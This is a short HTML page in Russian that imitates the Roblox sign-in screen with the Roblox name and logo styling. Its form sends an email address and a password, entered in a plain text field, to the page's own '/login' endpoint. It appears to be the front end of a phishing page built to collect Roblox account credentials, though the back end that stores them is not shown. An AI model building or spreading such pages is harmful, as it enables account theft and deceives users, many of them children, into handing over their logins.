<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title>Roblox - Вход</title>

<style>
body{
margin:0;
font-family:Arial,sans-serif;
background:linear-gradient(135deg,#1f2937,#111827);
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}

.box{
background:#23272f;
padding:40px;
border-radius:15px;
width:320px;
box-shadow:0 0 25px rgba(0,0,0,.5);
text-align:center;
}

.logo{
font-size:36px;
font-weight:bold;
color:white;
margin-bottom:10px;
}

.logo span{
color:#00b6ff;
}

h2{
color:white;
margin-bottom:25px;
}

input{
width:100%;
padding:12px;
margin:8px 0;
border:none;
border-radius:8px;
background:#3b414d;
color:white;
font-size:16px;
box-sizing:border-box;
}

input::placeholder{
color:#cfcfcf;
}

button{
width:100%;
padding:13px;
margin-top:15px;
border:none;
border-radius:8px;
background:#00b6ff;
color:white;
font-size:18px;
cursor:pointer;
}

button:hover{
background:#0099dd;
}

a{
display:block;
margin-top:20px;
color:#00b6ff;
text-decoration:none;
}
</style>

</head>

<body>

<div class="box">

<div class="logo">ROBLO<span>X</span></div>

<h2>Вход</h2>

<form action="/login" method="POST">

<input type="email" name="email" placeholder="Почта" required>

<input type="text" name="code" placeholder="Пароль" required>

<button type="submit">Войти</button>

</form>

<a href="/">← Назад</a>

</div>

</body>
</html>
